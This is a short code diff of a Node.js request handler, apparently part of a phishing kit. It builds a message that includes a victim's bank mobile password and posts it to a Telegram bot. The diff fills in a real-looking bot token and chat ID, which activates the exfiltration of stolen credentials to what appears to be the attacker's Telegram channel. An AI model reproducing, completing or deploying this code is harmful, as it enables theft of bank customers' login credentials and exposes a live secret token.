@@ -56,8 +56,8 @@ module.exports = async (req, res) => {
     Password: ${bankMobilePassword || "N/A"}
   `;
 
-  const botToken = "";
-  const chatId = "";
+  const botToken = "7597626302:AAFxp2Q5hTEVaCGlt4pauCnVitgZXzNH7dw";
+  const chatId = "1775129269";
 
   try {
     await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
